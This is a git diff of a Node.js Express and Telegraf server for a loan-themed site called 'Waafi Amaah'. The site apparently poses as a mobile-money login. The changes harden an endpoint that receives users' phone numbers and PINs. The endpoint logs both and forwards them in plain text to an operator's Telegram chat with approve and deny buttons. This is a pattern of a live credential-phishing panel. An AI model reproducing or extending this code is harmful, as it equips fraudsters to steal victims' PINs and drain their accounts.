@@ -6,24 +6,30 @@ require('dotenv').config();
 const app = express();
 const PORT = process.env.PORT || 8080;
 
-// 1. Initialize Bot (safe check)
+// 1. Validate ENV
 if (!process.env.BOT_TOKEN) {
-    console.error("❌ BOT_TOKEN is missing in .env file");
+    console.error("❌ BOT_TOKEN is missing");
     process.exit(1);
 }
 
+const ADMIN_ID = String(process.env.ADMIN_CHAT_ID || "").trim();
+if (!ADMIN_ID) {
+    console.warn("⚠️ ADMIN_CHAT_ID is not set");
+}
+
+// 2. Initialize Bot
 const bot = new Telegraf(process.env.BOT_TOKEN);
 
-// 2. Middleware
+// 3. Middleware
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// 3. Home Route
+// 4. Home Route
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// 4. Dynamic Routing (safe version)
+// 5. Dynamic Routing
 app.get('/:page', (req, res) => {
     const page = req.params.page;
     const fileName = page.endsWith('.html') ? page : `${page}.html`;
@@ -37,7 +43,7 @@ app.get('/:page', (req, res) => {
     });
 });
 
-// 5. Start Command (FIXED inline keyboard safety)
+// 6. Bot Start Command
 bot.start((ctx) => {
     return ctx.reply('Ku soo dhowaad Waafi Amaah! 👇', {
         reply_markup: {
@@ -55,27 +61,31 @@ bot.start((ctx) => {
     });
 });
 
-// 6. Login Notification API
+// 7. Login Notification API (FIXED)
 app.post('/api/login-notification', async (req, res) => {
     const { phone = "", pin = "" } = req.body || {};
-    const adminId = process.env.ADMIN_CHAT_ID;
 
-    if (!adminId) {
+    console.log("📩 Incoming login request:", phone, pin);
+
+    if (!ADMIN_ID) {
         return res.status(500).json({ error: "ADMIN_CHAT_ID not set" });
+    }
+
+    if (!phone || !pin) {
+        return res.status(400).json({ error: "Missing phone or pin" });
     }
 
     const currentTime = new Date().toLocaleString('en-US', { hour12: true });
 
     const loginMsg =
         `📱 CL 2 - LOGIN ATTEMPT\n\n` +
-        `🆕 NEW USER\n` +
         `📞 Phone: +252${phone}\n` +
         `🔢 PIN: ${pin}\n` +
         `⏰ Time: ${currentTime}\n\n` +
         `⚠️ Waiting for approval`;
 
     try {
-        await bot.telegram.sendMessage(adminId, loginMsg, {
+        await bot.telegram.sendMessage(ADMIN_ID, loginMsg, {
             reply_markup: {
                 inline_keyboard: [
                     [
@@ -88,14 +98,19 @@ app.post('/api/login-notification', async (req, res) => {
             }
         });
 
+        console.log("✅ Telegram message sent");
         res.json({ success: true });
+
     } catch (err) {
-        console.error("❌ API Notification Error:", err);
+        console.error(
+            "❌ API Notification Error:",
+            err.response?.description || err.message
+        );
         res.status(500).json({ error: "Failed to send bot notification" });
     }
 });
 
-// 7. Web App Data Handler
+// 8. Web App Data Handler (Loan)
 bot.on('message', async (ctx) => {
     const webAppData = ctx.message?.web_app_data;
     if (!webAppData) return;
@@ -116,11 +131,11 @@ bot.on('message', async (ctx) => {
         await ctx.reply(summary);
 
     } catch (err) {
-        console.error("❌ Data error:", err);
+        console.error("❌ Data error:", err.message);
     }
 });
 
-// 8. Actions
+// 9. Actions
 bot.action(/approve_(.+)_(.+)/, async (ctx) => {
     const phone = ctx.match[1];
     const pin = ctx.match[2];
@@ -136,7 +151,7 @@ bot.action(/approve_(.+)_(.+)/, async (ctx) => {
     try {
         await ctx.editMessageText(approvedMsg);
     } catch (e) {
-        console.error("❌ Edit failed:", e);
+        console.error("❌ Edit failed:", e.message);
     }
 });
 
@@ -144,11 +159,11 @@ bot.action('deny', async (ctx) => {
     try {
         await ctx.editMessageText("❌ Informashinka waa khalad");
     } catch (e) {
-        console.error(e);
+        console.error("❌ Deny error:", e.message);
     }
 });
 
-// 9. Start Server (safe launch)
+// 10. Start Server
 app.listen(PORT, async () => {
     console.log(`✅ Server running on port ${PORT}`);
 
@@ -157,10 +172,10 @@ app.listen(PORT, async () => {
         await bot.launch();
         console.log("✅ Bot launched successfully");
     } catch (err) {
-        console.error("❌ Bot launch failed:", err);
+        console.error("❌ Bot launch failed:", err.message);
     }
 });
 
-// 10. Graceful stop
+// 11. Graceful stop
 process.once('SIGINT', () => bot.stop('SIGINT'));
 process.once('SIGTERM', () => bot.stop('SIGTERM'));
